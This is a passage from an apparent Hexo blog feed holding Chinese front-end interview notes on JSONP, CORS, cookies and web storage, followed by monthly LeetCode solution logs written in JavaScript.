img标签向统计程序发出请求,实现统计，也可以使用第三方服务，如百度的提供的统计等</strong></li></ul><p>解决方式：</p><ul><li><p>JSONP：利用<code>&lt;script&gt;</code>可以绕过跨域限制，服务器可以任意拼接数据返回</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">    <span class="hljs-built_in">window</span>.callback = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;</span><span class="javascript">        <span class="hljs-built_in">console</span>.log(data);</span>    &#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://xxx.xxx/jsonp.js?username=xxx"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 服务器可以拿到username// jsonp.jscallback(&#123; name: 'dfg' &#125;)</code></pre></div><p>请求的数据会立马被浏览器当作javascript语句去执行，所以js文件中用一个函数调用数据的形式，变成一个可执行的js代码，也就是上文的callback(data)，这个函数定义在浏览器端的代码中，这样想要的数据就在包裹中完成传递</p></li><li><p>CORS：全称是”跨域资源共享”（Cross-origin resource sharing），需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。浏览器会在ajax<strong>简单请求</strong>中添加一个origin字段，用于指出当前请求属于哪个域（协议、域名、端口），之后服务器根据这个值决定是否允许其跨域，如果允许，返回的响应头需要携带以下信息：</p><div class="hljs"><pre><code class="hljs javascript">Access-Control-Allow-Origin: http:<span class="hljs-comment">//manage.leyou.com // 可接受的域，是一个具体域名或者*，代表任意</span>Access-Control-Allow-Credentials: <span class="hljs-literal">true</span> <span class="hljs-comment">// 是否允许携带cookie，默认情况下，cors不会携带cookie，除非这个值是true</span>Content-Type: text/html; charset=utf<span class="hljs-number">-8</span></code></pre></div><p>如果是特殊请求，比如PUT之类的，会在正式通信前用option发一次预检请求，增加信息如下：</p><div class="hljs"><pre><code class="hljs javascript">Access-Control-Request-Method：接下来会用到的请求方式，比如PUTAccess-Control-Request-Headers：会额外用到的头信息<span class="hljs-comment">// 例子</span>OPTIONS /cors HTTP/<span class="hljs-number">1.1</span>Origin: http:<span class="hljs-comment">//manage.leyou.com</span>Access-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.leyou.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/<span class="hljs-number">5.0</span>...</code></pre></div><p>server端收到option预检请求，如果允许跨域，会发出响应，包含以下增加信息：</p><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-string">Access-Control-Allow-Methods：允许访问的方式</span><span class="hljs-string">Access-Control-Allow-Headers：允许携带的头</span><span class="hljs-string">Access-Control-Max-Age：本次许可的有效时长，单位是秒，过期之前的ajax请求就无需再次进行预检了</span><span class="hljs-string">//</span> <span class="hljs-string">上面例子的回复</span><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span><span class="hljs-attr">Date:</span> <span class="hljs-string">Mon,</span> <span class="hljs-number">01</span> <span class="hljs-string">Dec</span> <span class="hljs-number">2008</span> <span class="hljs-number">01</span><span class="hljs-string">:15:39</span> <span class="hljs-string">GMT</span><span class="hljs-attr">Server:</span> <span class="hljs-string">Apache/2.0.61</span> <span class="hljs-string">(Unix)</span><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">http://manage.leyou.com</span><span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><span class="hljs-attr">Access-Control-Allow-Methods:</span> <span class="hljs-string">GET,</span> <span class="hljs-string">POST,</span> <span class="hljs-string">PUT</span><span class="hljs-attr">Access-Control-Allow-Headers:</span> <span class="hljs-string">X-Custom-Header</span><span class="hljs-attr">Access-Control-Max-Age:</span> <span class="hljs-number">1728000</span><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">text/html;</span> <span class="hljs-string">charset=utf-8</span><span class="hljs-attr">Content-Encoding:</span> <span class="hljs-string">gzip</span><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">0</span><span class="hljs-attr">Keep-Alive:</span> <span class="hljs-string">timeout=2,</span> <span class="hljs-string">max=100</span><span class="hljs-attr">Connection:</span> <span class="hljs-string">Keep-Alive</span><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">text/plain</span></code></pre></div><p>如果浏览器得到了上面的响应，后续与简单请求没有区别。</p></li></ul><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>cookie：</p><ul><li><p>本身用于浏览器与server通讯（请求头），被“借用”到本地存储（HTML5之前）</p></li><li><p>用<code>document.cookie=&#39;...&#39;</code>的方式来修改，且只能这样修改</p></li><li><p>字符串形式，key=value，用；分割，有以下几个属性：</p><div class="hljs"><pre><code class="hljs javascript">name <span class="hljs-comment">// cookie的名称</span>value <span class="hljs-comment">// cookie的值</span>domain <span class="hljs-comment">// 可以访问此cookie的域名</span><span class="hljs-comment">/*</span><span class="hljs-comment">设置：</span><span class="hljs-comment">非顶级域名，如二级域名或者三级域名，设置的cookie的domain只能为顶级域名或者二级域名或者三级域名本身，不能设置其他二级域名的cookie，否则cookie无法生成。</span><span class="hljs-comment">顶级域名只能设置domain为顶级域名，不能设置为二级域名或者三级域名，否则cookie无法生成。</span><span class="hljs-comment"></span><span class="hljs-comment">取值：</span><span class="hljs-comment">二级域名能读取设置了domain为顶级域名或者自身的cookie，不能读取其他二级域名domain的cookie。所以要想cookie在多个二级域名中共享，需要设置domain为顶级域名，这样就可以在所有二级域名里面或者到这个cookie的值了。</span><span class="hljs-comment">顶级域名只能获取到domain设置为顶级域名的cookie，其他domain设置为二级域名的无法获取。</span><span class="hljs-comment">*/</span>path <span class="hljs-comment">// domain下可访问此cookie的路径</span>expires/Max-Age <span class="hljs-comment">// 过期时间</span><span class="hljs-comment">/*</span><span class="hljs-comment">此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。</span><span class="hljs-comment">*/</span>Size <span class="hljs-comment">// cookie大小</span>http <span class="hljs-comment">/*</span><span class="hljs-comment">cookie的httponly属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie</span><span class="hljs-comment">*/</span>secure <span class="hljs-comment">// 设置是否只能通过https来传递此条cookie</span></code></pre></div></li><li><p>存储大小4KB（单个cookie），且http请求会将它发送到服务端，增加请求的数据量</p></li></ul><p>localStorage和sessionStorage：</p><ul><li><p>HTML5中专门为存储设计，最大5m（针对每个域名！！）</p></li><li><p>API用setItem、getItem</p><div class="hljs"><pre><code class="hljs javascript">localStorage.setItem(<span class="hljs-string">'a'</span>, <span class="hljs-number">100</span>);localStorage.getItem(<span class="hljs-string">'a'</span>) <span class="hljs-comment">// "100" 是字符串形式</span>localStorage.removeItem(<span class="hljs-string">'a'</span>);sessionStorage.setItem(<span class="hljs-string">'a'</span>, <span class="hljs-number">100</span>);sessionStorage.getItem(<span class="hljs-string">'a'</span>) <span class="hljs-comment">// "100" 是字符串形式</span>sessionStorage.removeItem(<span class="hljs-string">'a'</span>);</code></pre></div></li><li><p>不会随着http请求发送出去</p></li><li><p>localStorage数据会永久存储，除非代码或手动删除，而sessionStorage只存在于当前会话，浏览器关闭会清空</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JS基础&quot;&gt;&lt;a href=&quot;#JS基础&quot; class=&quot;headerlink&quot; title=&quot;JS基础&quot;&gt;&lt;/a&gt;JS基础&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;内容包含：原型、原型链、作用域、闭包、异步、单线程、DOM、BOM、Ajax、跨域、事件、存储&lt;/e</summary>
      
    
    
    
    <category term="前端八股文" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E5%85%AB%E8%82%A1%E6%96%87/"/>
    
    
    <category term="前端面试" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95/"/>
    
    <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>12月做题记录</title>
    <link href="http://yoursite.com/2020/12/14/12%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/12/14/12%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-12-14T12:52:38.000Z</published>
    <updated>2020-12-26T12:07:00.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="12月做题记录"><a href="#12月做题记录" class="headerlink" title="12月做题记录"></a>12月做题记录</h1><h3 id="字母异位词分组"><a href="#字母异位词分组" class="headerlink" title="字母异位词分组"></a><a href="https://leetcode-cn.com/problems/group-anagrams/" target="_blank" rel="noopener">字母异位词分组</a></h3><p>用单词的字典序做key，更秀的是JS中object可以用数组做key，可以统计26个字母的出现次数</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> groupAnagrams = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">strs</span>) </span>&#123;    <span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>();    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> str <span class="hljs-keyword">of</span> strs) &#123;        <span class="hljs-keyword">let</span> array = <span class="hljs-built_in">Array</span>.from(str);        array.sort();        <span class="hljs-keyword">let</span> key = array.toString();        <span class="hljs-keyword">let</span> list = map.get(key)?map.get(key):<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();        list.push(str);        map.set(key,list);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.from(map.values());&#125;;<span class="hljs-keyword">var</span> groupAnagrams = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">strs</span>) </span>&#123;    <span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> s <span class="hljs-keyword">of</span> strs) &#123;        <span class="hljs-keyword">const</span> count = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">26</span>).fill(<span class="hljs-number">0</span>);        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> s) count[c.charCodeAt()-<span class="hljs-string">'a'</span>.charCodeAt()]++;        map[count]?map[count].push(s):map[count]=[s];    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Object</span>.values(map);&#125;;</code></pre></div><h3 id="单调递增的数字"><a href="#单调递增的数字" class="headerlink" title="单调递增的数字"></a><a href="https://leetcode-cn.com/problems/monotone-increasing-digits/" target="_blank" rel="noopener">单调递增的数字</a></h3><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> monotoneIncreasingDigits = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">N</span>) </span>&#123;    <span class="hljs-keyword">const</span> strN = N.toString().split(<span class="hljs-string">''</span>).map(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> +v); <span class="hljs-comment">//将V变成number类型</span>    <span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>;    <span class="hljs-keyword">while</span>(i&lt;strN.length &amp;&amp; strN[i<span class="hljs-number">-1</span>]&lt;=strN[i]) i++;    <span class="hljs-keyword">if</span>(i &lt; strN.length) &#123;        <span class="hljs-keyword">while</span>(i&gt;<span class="hljs-number">0</span> &amp;&amp; strN[i<span class="hljs-number">-1</span>]&gt;strN[i]) &#123;            strN[i<span class="hljs-number">-1</span>]--;            i--;        &#125;        <span class="hljs-keyword">for</span>(i++;i&lt;strN.length;i++) strN[i]=<span class="hljs-number">9</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(strN.join(<span class="hljs-string">''</span>));&#125;;</code></pre></div><h3 id="买卖股票的最佳时机含手续费"><a href="#买卖股票的最佳时机含手续费" class="headerlink" title="买卖股票的最佳时机含手续费"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/" target="_blank" rel="noopener">买卖股票的最佳时机含手续费</a></h3><p>DP和贪心都可以</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> maxProfit = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">prices, fee</span>) </span>&#123;    <span class="hljs-keyword">let</span> n = prices.length;    <span class="hljs-keyword">let</span> buy = prices[<span class="hljs-number">0</span>]+fee;    <span class="hljs-keyword">let</span> profit = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">1</span>;i&lt;n;i++) &#123;        <span class="hljs-keyword">if</span>(prices[i]+fee &lt; buy) buy = prices[i]+fee;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(prices[i] &gt; buy) &#123;            profit += prices[i] - buy;            buy = prices[i];        &#125;    &#125;    <span class="hljs-keyword">return</span> profit;&#125;;</code></pre></div><h3 id="找不同"><a href="#找不同" class="headerlink" title="找不同"></a><a href="https://leetcode-cn.com/problems/find-the-difference/" target="_blank" rel="noopener">找不同</a></h3><p>用排序做时间复杂度O(logN)，可以遍历O(N)解决</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> findTheDifference = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">s, t</span>) </span>&#123;    <span class="hljs-keyword">let</span> sarr = s.split(<span class="hljs-string">''</span>).sort();    <span class="hljs-keyword">let</span> tarr = t.split(<span class="hljs-string">''</span>).sort();    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;sarr.length;i++) &#123;        <span class="hljs-keyword">if</span>(sarr[i] !== tarr[i]) <span class="hljs-keyword">return</span> tarr[i];    &#125;    <span class="hljs-keyword">return</span> tarr[sarr.length];&#125;;<span class="hljs-keyword">var</span> findTheDifference = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">s, t</span>) </span>&#123;    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> ch <span class="hljs-keyword">of</span> s) res ^= ch.charCodeAt();    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> ch <span class="hljs-keyword">of</span> t) res ^= ch.charCodeAt();    <span class="hljs-keyword">return</span> <span class="hljs-built_in">String</span>.fromCharCode(res);&#125;;</code></pre></div><h3 id="旋转图像"><a href="#旋转图像" class="headerlink" title="旋转图像"></a><a href="https://leetcode-cn.com/problems/rotate-image/" target="_blank" rel="noopener">旋转图像</a></h3><p>水平翻转加对角线反转就是旋转</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> rotate = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">matrix</span>) </span>&#123;    <span class="hljs-keyword">const</span> n = matrix.length;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-built_in">Math</span>.floor(n/<span class="hljs-number">2</span>);i++) &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>;j &lt; n;j++) &#123;            [matrix[i][j], matrix[n-i<span class="hljs-number">-1</span>][j]] = [matrix[n-i<span class="hljs-number">-1</span>][j], matrix[i][j]];        &#125;    &#125;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; n;i++) &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>;j &lt; i;j++) &#123;            [matrix[i][j], matrix[j][i]] = [matrix[j][i], matrix[i][j]];        &#125;    &#125;&#125;;</code></pre></div><h3 id="去除重复字母"><a href="#去除重复字母" class="headerlink" title="去除重复字母"></a><a href="https://leetcode-cn.com/problems/remove-duplicate-letters/" target="_blank" rel="noopener">去除重复字母</a></h3><p>indexOf从i开始找栈顶元素保证栈中可以保留每个字符一次，不会误删除</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> removeDuplicateLetters = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">s</span>) </span>&#123;    <span class="hljs-keyword">let</span> stack = [];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>, len = s.length;i &lt; len;i++) &#123;        <span class="hljs-keyword">let</span> ch = s[i];        <span class="hljs-keyword">if</span>(stack.indexOf(ch) &gt; <span class="hljs-number">-1</span>) <span class="hljs-keyword">continue</span>;        <span class="hljs-keyword">while</span>(stack.length &gt; <span class="hljs-number">0</span> &amp;&amp; stack[stack.length - <span class="hljs-number">1</span>] &gt; ch &amp;&amp; s.indexOf(stack[stack.length - <span class="hljs-number">1</span>], i) &gt; i) stack.pop();        stack.push(ch);    &#125;    <span class="hljs-keyword">return</span> stack.join(<span class="hljs-string">''</span>);&#125;;</code></pre></div><h3 id="二叉树的锯齿形层序遍历"><a href="#二叉树的锯齿形层序遍历" class="headerlink" title="二叉树的锯齿形层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal/" target="_blank" rel="noopener">二叉树的锯齿形层序遍历</a></h3><p>用双端队列写更简单，一层循环用布尔值控制方向(push还是unshift)</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> zigzagLevelOrder = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">if</span>(root === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> [];    <span class="hljs-keyword">let</span> left = [];    <span class="hljs-keyword">let</span> right = [];    <span class="hljs-keyword">let</span> res = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;    left.push(root);    <span class="hljs-keyword">while</span>(left.length !== <span class="hljs-number">0</span> || right.length !== <span class="hljs-number">0</span>) &#123;        res[i] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();        <span class="hljs-keyword">if</span>(left.length !== <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">while</span>(left.length !== <span class="hljs-number">0</span>) &#123;                <span class="hljs-keyword">let</span> node = left.pop();                res[i].push(node.val);                <span class="hljs-keyword">if</span>(node.left !== <span class="hljs-literal">null</span>) right.push(node.left);                <span class="hljs-keyword">if</span>(node.right !== <span class="hljs-literal">null</span>) right.push(node.right);            &#125;            i++;            <span class="hljs-keyword">continue</span>;        &#125;        <span class="hljs-keyword">if</span>(right.length !== <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">while</span>(right.length !== <span class="hljs-number">0</span>) &#123;                <span class="hljs-keyword">let</span> node = right.pop();                res[i].push(node.val);                <span class="hljs-keyword">if</span>(node.right !== <span class="hljs-literal">null</span>) left.push(node.right);                <span class="hljs-keyword">if</span>(node.left !== <span class="hljs-literal">null</span>) left.push(node.left);            &#125;            i++;        &#125;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="使用最小花费爬楼梯"><a href="#使用最小花费爬楼梯" class="headerlink" title="使用最小花费爬楼梯"></a><a href="https://leetcode-cn.com/problems/min-cost-climbing-stairs/" target="_blank" rel="noopener">使用最小花费爬楼梯</a></h3><p>到达i的方式只有两种：从i-1走一步或从i-2走两步，动态规划即可，可以优化空间</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> minCostClimbingStairs = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">cost</span>) </span>&#123;    <span class="hljs-keyword">let</span> dp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(cost.length).fill(<span class="hljs-number">0</span>);    dp[<span class="hljs-number">0</span>] = cost[<span class="hljs-number">0</span>];    dp[<span class="hljs-number">1</span>] = cost[<span class="hljs-number">1</span>];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">2</span>, len = cost.length;i &lt; len;i++) &#123;        dp[i] = cost[i] + <span class="hljs-built_in">Math</span>.min(dp[i<span class="hljs-number">-1</span>],dp[i<span class="hljs-number">-2</span>]);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.min(dp[cost.length<span class="hljs-number">-1</span>],dp[cost.length<span class="hljs-number">-2</span>]);&#125;;</code></pre></div><h3 id="分发糖果"><a href="#分发糖果" class="headerlink" title="分发糖果"></a><a href="https://leetcode-cn.com/problems/candy/" target="_blank" rel="noopener">分发糖果</a></h3><p>同时满足左遍历和右遍历条件的最大值，没太看懂如何证明有效</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> candy = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">ratings</span>) </span>&#123;    <span class="hljs-keyword">let</span> left = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(ratings.length).fill(<span class="hljs-number">1</span>);    <span class="hljs-keyword">let</span> right = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(ratings.length).fill(<span class="hljs-number">1</span>);    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>, len = ratings.length;i &lt; len;i++) &#123;        <span class="hljs-keyword">if</span>(ratings[i] &gt; ratings[i<span class="hljs-number">-1</span>]) left[i] = left[i<span class="hljs-number">-1</span>] + <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">let</span> count = left[ratings.length - <span class="hljs-number">1</span>];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = ratings.length - <span class="hljs-number">2</span>;i &gt;= <span class="hljs-number">0</span>;i--) &#123;        <span class="hljs-keyword">if</span>(ratings[i] &gt; ratings[i+<span class="hljs-number">1</span>]) right[i] = right[i+<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;        count += <span class="hljs-built_in">Math</span>.max(left[i],right[i]);    &#125;    <span class="hljs-keyword">return</span> count;&#125;;</code></pre></div><h3 id="分发饼干"><a href="#分发饼干" class="headerlink" title="分发饼干"></a><a href="https://leetcode-cn.com/problems/assign-cookies/" target="_blank" rel="noopener">分发饼干</a></h3><p>贪心就可以</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> findContentChildren = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">g, s</span>) </span>&#123;    g.sort(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b);    s.sort(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b);    <span class="hljs-keyword">let</span> childNum = g.length, cookieNum = s.length;    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;i &lt; childNum &amp;&amp; j &lt; cookieNum;i++, j++) &#123;        <span class="hljs-keyword">while</span>(j &lt; cookieNum &amp;&amp; g[i] &gt; s[j]) j++;        <span class="hljs-keyword">if</span>(j &lt; cookieNum) res++;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h4 id="圣诞节快乐！！！"><a href="#圣诞节快乐！！！" class="headerlink" title="圣诞节快乐！！！"></a>圣诞节快乐！！！</h4><h3 id="最大矩形"><a href="#最大矩形" class="headerlink" title="最大矩形"></a><a href="https://leetcode-cn.com/problems/maximal-rectangle/" target="_blank" rel="noopener">最大矩形</a></h3><p>和之前的最大柱状图一个道理，统计矩阵每个点左侧1的数量后就相当于将每一列都看作一排柱状图的底，将这些列作为输入送到最大柱状图的代码中找到最大值即可</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> maximalRectangle = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">matrix</span>) </span>&#123;    <span class="hljs-keyword">const</span> m = matrix.length;    <span class="hljs-keyword">if</span> (m === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-keyword">const</span> n = matrix[<span class="hljs-number">0</span>].length;    <span class="hljs-keyword">const</span> left = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(m).fill(<span class="hljs-number">0</span>).map(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(n).fill(<span class="hljs-number">0</span>));    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;            <span class="hljs-keyword">if</span> (matrix[i][j] === <span class="hljs-string">'1'</span>) &#123;                left[i][j] = (j === <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : left[i][j - <span class="hljs-number">1</span>]) + <span class="hljs-number">1</span>;            &#125;        &#125;    &#125;    <span class="hljs-keyword">let</span> height = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(m);    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;            height[j] = left[j][i];        &#125;        res = <span class="hljs-built_in">Math</span>.max(res,largestRectangleArea(height));    &#125;    <span class="hljs-keyword">return</span> res;&#125;;<span class="hljs-keyword">var</span> largestRectangleArea = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">heights</span>) </span>&#123;    <span class="hljs-keyword">let</span> maxArea = <span class="hljs-number">0</span>;    <span class="hljs-keyword">const</span> stack = [];    heights = [<span class="hljs-number">0</span>,...heights,<span class="hljs-number">0</span>];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;heights.length;i++) &#123;        <span class="hljs-keyword">while</span>(heights[i] &lt; heights[stack[stack.length<span class="hljs-number">-1</span>]]) &#123;            <span class="hljs-keyword">let</span> stackTopIndex = stack.pop();            maxArea = <span class="hljs-built_in">Math</span>.max(maxArea,heights[stackTopIndex]*(i-stack[stack.length<span class="hljs-number">-1</span>]<span class="hljs-number">-1</span>));        &#125;        stack.push(i);    &#125;    <span class="hljs-keyword">return</span> maxArea;&#125;;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;12月做题记录&quot;&gt;&lt;a href=&quot;#12月做题记录&quot; class=&quot;headerlink&quot; title=&quot;12月做题记录&quot;&gt;&lt;/a&gt;12月做题记录&lt;/h1&gt;&lt;h3 id=&quot;字母异位词分组&quot;&gt;&lt;a href=&quot;#字母异位词分组&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="HOT100" scheme="http://yoursite.com/tags/HOT100/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>11月做题记录</title>
    <link href="http://yoursite.com/2020/11/01/11%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/11/01/11%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-01T04:45:34.000Z</published>
    <updated>2020-11-18T03:03:19.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="11月做题记录"><a href="#11月做题记录" class="headerlink" title="11月做题记录"></a>11月做题记录</h1><h3 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/" target="_blank" rel="noopener">最长上升子序列</a></h3><p>dp搜索每一个nums[i]之前的项，赋给其能给的最大值，所以优化时间复杂度可以使用二分</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number[]&#125;</span> <span class="hljs-variable">nums</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-comment">// var lengthOfLIS = function(nums) &#123;</span><span class="hljs-comment">//     dp = [1];</span><span class="hljs-comment">//     for(var i=1;dp[i]=1,i&lt;nums.length;i++) &#123;</span><span class="hljs-comment">//         for(var j=0;j&lt;i;j++) &#123;</span><span class="hljs-comment">//             nums[i]&gt;nums[j] &amp;&amp; (dp[i]=Math.max(dp[j]+1,dp[i]));</span><span class="hljs-comment">//         &#125;</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">//     return nums.length&lt;2?nums.length:Math.max(...dp);</span><span class="hljs-comment">// &#125;;</span><span class="hljs-keyword">var</span> lengthOfLIS = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) </span>&#123;    <span class="hljs-keyword">let</span> n = nums.length;    <span 